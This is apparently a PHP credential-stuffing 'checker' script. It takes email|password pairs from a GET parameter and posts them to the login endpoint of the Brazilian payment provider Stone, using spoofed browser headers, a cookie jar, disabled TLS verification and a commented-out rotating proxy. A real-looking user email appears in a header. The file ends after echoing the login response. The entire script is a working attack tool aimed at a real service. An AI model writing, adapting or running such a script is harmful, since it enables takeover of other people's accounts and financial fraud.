<?php
/*
*Author: Pugno <pugno_fc>
*/
#############################################
error_reporting(0);
set_time_limit(0);
session_start();
#############################################

function getStr($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

if (file_exists("cookie.txt")!== false) {unlink("cookie.txt");fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}else{fopen
  ("cookie.txt", 'w+');fclose
  ("cookie.txt");}
$time = time();

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

$lista = ("$email|$senha");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://login.stone.com.br/auth/realms/stone_account/login-actions/authenticate?session_code=-fBrvT24S0ZXBEXqS575Uxtb-_I5zx6Wr9_5WchBv-I&execution=f3e4f02b-4abb-439f-854b-5901c34cb295&client_id=customer-portal-front-end&tab_id=XhvmPUzZ9W0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
#curl_setopt($ch, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'pzhiezyh-rotate:pzhiezyh-rotate');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'upgrade-insecure-requests: 1',
'origin: https://login.stone.com.br',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-gpc: 1',
'sec-fetch-site: same-origin',
'sec-fetch-mode: navigate',
'sec-fetch-user: ?1',
'sec-fetch-dest: document',
'referer: https://login.stone.com.br/auth/realms/stone_account/protocol/openid-connect/auth?client_id=customer-portal-front-end&redirect_uri=https%3A%2F%2Fportal.stone.com.br%2Fresumo&state=d9478592-3615-454c-9031-ecff6a5dbfa3&response_mode=fragment&response_type=code&scope=openid%20offline_access&nonce=1a289069-a761-45e0-92d7-f4c2a38b4fa5&login_hint=joaopaulosilva%40hotmail.com',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',

));
curl_setopt($ch, CURLOPT_POSTFIELDS,'username='.$email.'&password='.$senha);
echo $data1 = curl_exec($ch);
